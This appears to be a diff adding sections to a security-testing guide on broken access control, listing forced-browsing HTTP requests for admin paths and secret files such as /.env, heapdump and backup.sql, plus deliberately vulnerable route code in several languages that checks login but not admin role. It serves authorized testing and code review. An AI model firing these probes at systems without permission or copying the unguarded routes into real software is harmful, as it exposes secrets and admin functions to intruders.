@@ -30,6 +30,119 @@ The unsafe assumption is that users cannot discover unlinked URLs. Impact includ
 | **Method gap** | GET protected on admin page while POST `/admin/delete` lacks the same check |
 | **Parallel channels** | Mobile API v2, GraphQL resolvers, WebSocket handlers missing admin checks |
 
+## Attack Payloads
+
+Use these in authorized tests when you are authenticated as a non-admin user. Directly request paths that are omitted from the UI menu.
+
+### Pattern 1: Admin console paths
+
+```http
+GET /admin HTTP/1.1
+GET /admin/users HTTP/1.1
+GET /administrator/dashboard HTTP/1.1
+GET /manage/settings HTTP/1.1
+```
+
+### Pattern 2: Framework and ops endpoints
+
+```http
+GET /actuator/env HTTP/1.1
+GET /actuator/heapdump HTTP/1.1
+GET /swagger-ui.html HTTP/1.1
+GET /debug/pprof/ HTTP/1.1
+GET /.env HTTP/1.1
+```
+
+### Pattern 3: Internal and legacy API versions
+
+```http
+GET /api/internal/export HTTP/1.1
+GET /api/v1/admin/reports HTTP/1.1
+GET /api/v2/users?all=true HTTP/1.1
+GET /legacy/servlet/AdminServlet HTTP/1.1
+```
+
+### Pattern 4: Alternate HTTP methods on same path
+
+```http
+GET /admin/delete?id=5 HTTP/1.1
+POST /admin/delete HTTP/1.1
+# GET blocked by role check; POST unprotected
+```
+
+### Pattern 5: Static and backup filenames
+
+```text
+/backup.sql
+/config.json
+/server-status
+/phpinfo.php
+```
+
+## Language-Specific Sinks and Dangerous APIs
+
+Map route registration and security filters. Login checks alone do not protect admin functionality.
+
+### Python
+
+```python
+@app.route("/admin/users")
+def admin_users():
+    if "user" in session:  # no admin role
+        return render_template("admin_users.html", users=db.all_users())
+```
+
+Flask blueprints without `@roles_required`. Django: views missing `@user_passes_test` or permission decorator.
+
+### Java
+
+```java
+@GetMapping("/admin/settings")
+public String settings() { return "ok"; }  // no @PreAuthorize("hasRole('ADMIN')")
+
+http.authorizeHttpRequests(auth -> auth
+    .requestMatchers("/public/**").permitAll()
+    .anyRequest().authenticated());  // not hasRole
+```
+
+Spring Security: `authenticated()` without `hasRole`; `@WebFilter` that only checks `session != null`.
+
+### C#
+
+```csharp
+[Authorize]
+public IActionResult AdminUsers() => View(_db.Users.ToList());
+
+app.MapGet("/internal/health/detailed", () => secrets);
+```
+
+`[Authorize]` without role policy; minimal APIs mapped without `RequireAuthorization("AdminOnly")`.
+
+### JavaScript (Node.js)
+
+```javascript
+app.get('/admin', requireLogin, adminPage);
+app.use('/api/internal', internalRouter);  // auth but no role middleware
+```
+
+Express: `isAuthenticated` without `isAdmin`; Next.js API routes without RBAC.
+
+### Go
+
+```go
+mux.Handle("/admin/", authOnly(adminHandler))  // missing role check
+http.HandleFunc("/debug/pprof/", pprof.Index)
+```
+
+Chi/gin: JWT valid but no `RequireRole("admin")` on sensitive groups.
+
+### nginx / reverse proxy (deployment)
+
+```nginx
+location /admin { }  # no IP allowlist or auth_request in prod
+location ~ /\. { }    # dotfiles accidentally exposed
+```
+
 ## Sample Vulnerable Code in Python
 
 ```python
